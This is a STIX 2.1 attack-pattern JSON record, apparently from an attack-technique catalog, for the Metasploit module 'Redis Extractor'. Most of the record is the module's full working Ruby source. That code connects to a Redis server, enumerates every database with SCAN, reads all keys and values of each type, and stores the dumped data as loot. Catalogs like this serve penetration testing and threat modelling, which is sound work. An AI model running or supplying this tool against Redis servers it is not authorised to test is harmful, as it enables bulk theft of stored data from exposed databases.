{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08e7b9ce-0bf4-4ae6-973b-1e5ea923cd21",
    "created": "2024-08-14T16:32:35.943656Z",
    "modified": "2024-08-14T16:32:35.94366Z",
    "name": "Redis Extractor",
    "description": " This module connects to a Redis instance and retrieves keys and data stored. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/redis_extractor.rb",
            "external_id": "redis_extractor.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://redis.io/topics/protocol"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Redis\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Redis Extractor',\n        'Description' => %q{\n          This module connects to a Redis instance and retrieves keys and data stored.\n        },\n        'Author' => ['Geoff Rainville noncenz[at]ultibits.com'],\n        'License' => MSF_LICENSE,\n        'References' => [['URL', 'https://redis.io/topics/protocol']],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptInt.new('LIMIT_COUNT', [false, 'Stop after retrieving this many entries, per database', nil])\n      ]\n    )\n  end\n\n  MIN_REDIS_VERSION = '2.8.0'.freeze\n\n  # Recurse to assemble the full list of keys\n  def scan(offset)\n    response = redis_command('scan', offset)\n    parsed = parse_redis_response(response)\n    raise 'Unexpected RESP response length' unless parsed.length == 2\n\n    new_offset = parsed[0] # cursor position for next iteration or zero if we are done\n    keys = parsed[1]\n    results = []\n    keys.each do |key|\n      value = value_for_key(key)\n      if value\n        results.push([key, value])\n      end\n    end\n    [new_offset, results]\n  end\n\n  def value_for_key(key)\n    key_type = redis_command('TYPE', key)\n    return unless key_type\n\n    key_type = parse_redis_response(key_type)\n    case key_type\n    when 'string'\n      string_content = redis_command('get', key)\n      return unless string_content\n\n      return parse_redis_response(string_content)\n    when 'list'\n      list_content = redis_command('LRANGE', key, '0', '-1')\n      return unless list_content\n\n      return parse_redis_response(list_content)\n    when 'set'\n      set_content = redis_command('SMEMBERS', key)\n      return unless set_content\n\n      return parse_redis_response(set_content)\n    when 'zset'\n      set_content = redis_command('ZRANGE', key, '0', '-1')\n      return unless set_content\n\n      return parse_redis_response(set_content)\n    when 'hash'\n      hash_content = parse_redis_response(redis_command('HGETALL', key))\n      return unless hash_content\n\n      result = {}\n      (0..hash_content.length - 1).step(2) do |x|\n        result[hash_content[x]] = hash_content[x + 1]\n      end\n      return result\n    when 'none'\n      # May have been deleted in the interim\n      return nil\n    else\n      return 'unknown key type ' + key_type\n    end\n  end\n\n  # Connect to Redis and ensure compatibility.\n  def redis_connect\n    connect\n    # NOTE: Full INFO payload fails occasionally. Using server filter until Redis library can be fixed\n    if (info_data = redis_command('INFO', 'server')) && /redis_version:(?<redis_version>\\S+)/ =~ info_data\n      print_good(\"Connected to Redis version #{redis_version}\")\n    end\n\n    # Some connection attempts such as incorrect password set fail silently in the Redis library.\n    if !info_data\n      print_error('Unable to connect to Redis')\n      print_error('Set verbose true to troubleshoot') if !datastore['VERBOSE']\n      return\n    end\n\n    # Ensure version compatability\n    if (Rex::Version.new(redis_version) < Rex::Version.new(MIN_REDIS_VERSION))\n      print_status(\"Module supports Redis #{MIN_REDIS_VERSION} or higher.\")\n      return\n    end\n\n    # Connection was sucessful\n    return info_data\n  rescue Msf::Auxiliary::Failed => e\n    # This error trips when auth is required but password not set\n    print_error('Unable to connect to Redis: ' + e.message)\n    return\n  rescue Rex::ConnectionTimeout\n    print_error('Timed out trying to connect to Redis')\n    return\n  rescue StandardError\n    print_error('Unknown error trying to connect to Redis')\n    return\n  end\n\n  def check_host(_ip)\n    info_data = redis_connect\n    if info_data\n      if /os:(?<os_ver>.*)\\r/ =~ info_data\n        os_ver = os_ver.strip\n        print_status(\"OS is #{os_ver} \")\n      end\n\n      if /keys=(?<keys>\\S+),expires=/ =~ info_data\n        print_status(\"Redis reports #{keys} keys stored\")\n      end\n\n      if /used_memory_peak_human:(?<bytes>.*)\\r/ =~ info_data\n        bytes = bytes.strip\n        print_status(\"#{bytes.chomp} bytes stored\")\n      end\n    end\n    disconnect\n    return info_data ? Msf::Exploit::CheckCode::Appears : Msf::Exploit::CheckCode::Unknown\n  end\n\n  def get_keyspace\n    ks = redis_command('INFO', 'keyspace')\n    ks = parse_redis_response(ks)\n    ks = ks.split(\"\\r\\n\")\n    result = []\n    ks.each do |k|\n      if /db(?<db>\\S+):/ =~ k && /keys=(?<keys>\\S+),expires/ =~ k\n        result.append([db, keys])\n      end\n    end\n    return result\n  end\n\n  def run_host(_ip)\n    if !redis_connect\n      disconnect\n      return\n    end\n\n    keyspace = get_keyspace\n    max_results = datastore['LIMIT_COUNT']\n    keyspace.each do |space|\n      if max_results\n        amount = \"#{[space[1].to_i, max_results].min} of #{space[1]}\"\n      else\n        amount = (space[1]).to_s\n      end\n      print_status(\"Extracting about #{amount} keys from database #{space[0]}\")\n      redis_command('SELECT', space[0])\n      new_offset = '0'\n      all_results = []\n      loop do\n        new_offset, results = scan(new_offset)\n        all_results.concat(results)\n        break if max_results && all_results.count >= max_results\n        break if new_offset == '0'\n      end\n\n      if all_results.empty?\n        print_status('No keys returned')\n        next\n      end\n\n      # Report data in terminal\n      result_table = Rex::Text::Table.new(\n        'Header' => \"Data from #{peer} database #{space[0]}\",\n        'Indent' => 1,\n        'Columns' => [ 'Key', 'Value' ]\n      )\n      all_results.each { |pair| result_table << pair }\n      print_line\n      print_line(result_table.to_s)\n\n      # Store data as loot\n      csv = []\n      all_results.each { |pair| csv << pair.to_csv }\n      path = store_loot(\"redis.dump_db#{space[0]}\", 'text/plain', rhost, csv.join, 'redis.txt', 'Redis extractor')\n      print_good(\"Redis data stored at #{path}\")\n    end\n    disconnect\n  end\nend\n"
}